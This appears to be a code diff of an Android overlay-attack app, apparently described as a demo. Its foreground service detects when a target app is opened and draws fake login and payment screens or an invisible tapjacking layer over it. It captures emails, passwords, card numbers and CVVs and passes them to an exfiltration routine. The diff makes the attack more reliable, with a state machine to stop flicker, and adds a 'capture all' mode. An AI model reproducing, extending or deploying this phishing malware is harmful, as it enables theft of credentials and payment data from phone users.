@@ -8,6 +8,7 @@ import android.os.Looper
 import android.util.Log
 import com.ghosttouch.attacker.capture.SessionRepository
 import com.ghosttouch.attacker.exfil.DataExfiltrator
+import com.ghosttouch.attacker.overlay.CaptureAllOverlay
 import com.ghosttouch.attacker.overlay.FakeLoginOverlay
 import com.ghosttouch.attacker.overlay.FakePaymentOverlay
 import com.ghosttouch.attacker.overlay.OverlayManager
@@ -16,21 +17,17 @@ import com.ghosttouch.attacker.overlay.TapjackingOverlay
 /**
  * Foreground service that orchestrates the overlay attack demo.
  *
- * ## Lifecycle
- * 1. Started via [startForegroundService] from the launcher activity
- * 2. Displays a persistent notification (required for foreground services on API 26+)
- * 3. Polls [ForegroundDetector] every [POLL_INTERVAL_MS] to check the current foreground app
- * 4. When the target app ([TARGET_PACKAGE]) is detected, triggers the overlay
- * 5. When the target app leaves the foreground, hides the overlay
+ * ## State machine
+ * The service uses a simple state machine to prevent flickering:
+ * - IDLE: No overlay shown, polling for target app
+ * - SHOWING: Overlay is displayed (or pending display), no re-triggers
+ * - COOLDOWN: Recently dismissed, waiting before allowing re-trigger
  *
  * ## Attack modes
- * - **LOGIN**: Displays a fake login screen matching the target app's UI
- * - **PAYMENT**: Displays a fake payment screen
- * - **TAPJACKING**: Displays an invisible overlay for click interception
- *
- * ## Important
- * This service only functions when both SYSTEM_ALERT_WINDOW and PACKAGE_USAGE_STATS
- * permissions have been granted by the user.
+ * - **LOGIN**: Fake login screen matching target app
+ * - **PAYMENT**: Fake payment screen
+ * - **TAPJACKING**: Invisible overlay for click interception
+ * - **CAPTURE_ALL**: Combined login + payment capture with auto-rotation
  */
 class OverlayService : Service() {
 
@@ -39,8 +36,12 @@ class OverlayService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private var isPolling = false
 
-    /** Timestamp of last overlay dismiss — used to prevent immediate re-trigger. */
-    private var lastDismissTime = 0L
+    /** Service state machine to prevent flickering. */
+    private enum class State { IDLE, SHOWING, COOLDOWN }
+    private var state = State.IDLE
+
+    /** Timestamp when cooldown started. */
+    private var cooldownStartTime = 0L
 
     /** The polling runnable that checks the foreground app periodically. */
     private val pollRunnable = object : Runnable {
@@ -48,17 +49,40 @@ class OverlayService : Service() {
             if (!isPolling) return
 
             val foregroundPackage = foregroundDetector.getCurrentForegroundPackage()
-            val cooldownElapsed = System.currentTimeMillis() - lastDismissTime > COOLDOWN_MS
 
-            if (foregroundPackage == TARGET_PACKAGE && !overlayManager.isShowing && cooldownElapsed) {
-                Log.d(TAG, "Target app detected: $foregroundPackage — triggering overlay")
-                triggerOverlay()
-            } else if (foregroundPackage != TARGET_PACKAGE && overlayManager.isShowing) {
-                Log.d(TAG, "Target app left foreground — hiding overlay")
-                overlayManager.hide()
+            when (state) {
+                State.IDLE -> {
+                    if (foregroundPackage == TARGET_PACKAGE) {
+                        Log.d(TAG, "Target detected in IDLE state — triggering overlay")
+                        state = State.SHOWING
+                        triggerOverlay()
+                    }
+                }
+                State.SHOWING -> {
+                    // Only hide if target app has DEFINITELY left foreground
+                    // AND the overlay is actually visible (not just pending)
+                    if (foregroundPackage != TARGET_PACKAGE &&
+                        foregroundPackage.isNotEmpty() &&
+                        overlayManager.isVisible) {
+                        Log.d(TAG, "Target left foreground while SHOWING — hiding overlay")
+                        overlayManager.hide()
+                        enterCooldown()
+                    }
+                    // If overlay somehow disappeared but state is still SHOWING, reset
+                    if (!overlayManager.isShowing && !overlayManager.isVisible) {
+                        Log.d(TAG, "Overlay disappeared unexpectedly — returning to IDLE")
+                        state = State.IDLE
+                    }
+                }
+                State.COOLDOWN -> {
+                    val elapsed = System.currentTimeMillis() - cooldownStartTime
+                    if (elapsed > COOLDOWN_MS) {
+                        Log.d(TAG, "Cooldown expired — returning to IDLE")
+                        state = State.IDLE
+                    }
+                }
             }
 
-            // Schedule next poll
             handler.postDelayed(this, POLL_INTERVAL_MS)
         }
     }
@@ -71,13 +95,15 @@ class OverlayService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // Read attack mode from intent extras
         currentMode = intent?.getStringExtra(EXTRA_MODE) ?: MODE_LOGIN
 
-        // Start as foreground service with persistent notification
-        startForeground(NotificationHelper.NOTIFICATION_ID, NotificationHelper.buildServiceNotification(this))
+        startForeground(
+            NotificationHelper.NOTIFICATION_ID,
+            NotificationHelper.buildServiceNotification(this)
+        )
 
-        // Begin polling
+        // Reset state and start fresh
+        state = State.IDLE
         startPolling()
 
         Log.d(TAG, "OverlayService started — mode: $currentMode, target: $TARGET_PACKAGE")
@@ -89,58 +115,61 @@ class OverlayService : Service() {
     override fun onDestroy() {
         stopPolling()
         overlayManager.hide()
+        state = State.IDLE
         Log.d(TAG, "OverlayService destroyed")
         super.onDestroy()
     }
 
-    /**
-     * Starts the polling loop that monitors the foreground app.
-     */
     private fun startPolling() {
         if (isPolling) return
         isPolling = true
         handler.post(pollRunnable)
     }
 
-    /**
-     * Stops the polling loop.
-     */
     private fun stopPolling() {
         isPolling = false
         handler.removeCallbacks(pollRunnable)
     }
 
+    /** Transitions to cooldown state after an overlay is dismissed. */
+    private fun enterCooldown() {
+        state = State.COOLDOWN
+        cooldownStartTime = System.currentTimeMillis()
+        Log.d(TAG, "Entered COOLDOWN for ${COOLDOWN_MS}ms")
+    }
+
+    /** Common dismiss handler for all overlay types. */
+    private fun onOverlayDismissed() {
+        handler.post {
+            overlayManager.hide()
+            enterCooldown()
+        }
+    }
+
     /**
      * Triggers the appropriate overlay based on the current attack mode.
-     *
-     * Adds a configurable delay (300-500ms) to simulate realistic timing —
-     * showing the overlay too fast might look suspicious to the user.
      */
     private fun triggerOverlay() {
         when (currentMode) {
             MODE_LOGIN -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                 FakeLoginOverlay(
                     onCredentialsCaptured = { email, password ->
-                        Log.d(TAG, "Credentials captured — email: $email")
+                        Log.d(TAG, "LOGIN captured — email: $email, pass length: ${password.length}")
                         val session = SessionRepository.captureLogin(
                             targetApp = TARGET_PACKAGE,
                             email = email,
                             password = password
                         )
-                        // Simulate data exfiltration
                         DataExfiltrator.exfiltrate(session)
                     },
-                    onDismiss = {
-                        overlayManager.hide()
-                        lastDismissTime = System.currentTimeMillis()
-                    }
+                    onDismiss = ::onOverlayDismissed
                 )
             }
 
             MODE_PAYMENT -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                 FakePaymentOverlay(
                     onPaymentCaptured = { cardNumber, expiry, cvv ->
-                        Log.d(TAG, "Payment captured — card ending: ${cardNumber.takeLast(4)}")
+                        Log.d(TAG, "PAYMENT captured — card: *${cardNumber.takeLast(4)}")
                         val session = SessionRepository.capturePayment(
                             targetApp = TARGET_PACKAGE,
                             cardNumber = cardNumber,
@@ -149,17 +178,28 @@ class OverlayService : Service() {
                         )
                         DataExfiltrator.exfiltrate(session)
                     },
-                    onDismiss = {
-                        overlayManager.hide()
-                        lastDismissTime = System.currentTimeMillis()
-                    }
+                    onDismiss = ::onOverlayDismissed
+                )
+            }
+
+            MODE_CAPTURE_ALL -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
+                CaptureAllOverlay(
+                    onDataCaptured = { fields ->
+                        Log.d(TAG, "CAPTURE_ALL captured — ${fields.size} fields: ${fields.keys}")
+                        val session = SessionRepository.captureAll(
+                            targetApp = TARGET_PACKAGE,
+                            fields = fields
+                        )
+                        DataExfiltrator.exfiltrate(session)
+                    },
+                    onDismiss = ::onOverlayDismissed
                 )
             }
 
             MODE_TAPJACKING -> overlayManager.showTapjacking {
                 TapjackingOverlay(
                     onTapDetected = { x, y ->
-                        Log.d(TAG, "Tapjacking: tap detected at ($x, $y)")
+                        Log.d(TAG, "Tapjacking: tap at ($x, $y)")
                     }
                 )
             }
@@ -169,27 +209,18 @@ class OverlayService : Service() {
     companion object {
         private const val TAG = "OverlayService"
 
-        /** Package name of the target app to overlay. */
         const val TARGET_PACKAGE = "com.wcdonalds.app"
-
-        /** Polling interval for foreground app detection (milliseconds). */
         private const val POLL_INTERVAL_MS = 700L
-
-        /** Delay before showing the overlay after detection (milliseconds). */
         private const val OVERLAY_DELAY_MS = 400L
-
-        /** Cooldown after dismiss before overlay can re-trigger (milliseconds). */
         private const val COOLDOWN_MS = 10_000L
 
-        /** Intent extra key for attack mode. */
         const val EXTRA_MODE = "attack_mode"
 
-        /** Attack modes. */
         const val MODE_LOGIN = "login"
         const val MODE_PAYMENT = "payment"
         const val MODE_TAPJACKING = "tapjacking"
+        const val MODE_CAPTURE_ALL = "capture_all"
 
-        /** Current attack mode. */
         var currentMode = MODE_LOGIN
             private set
     }
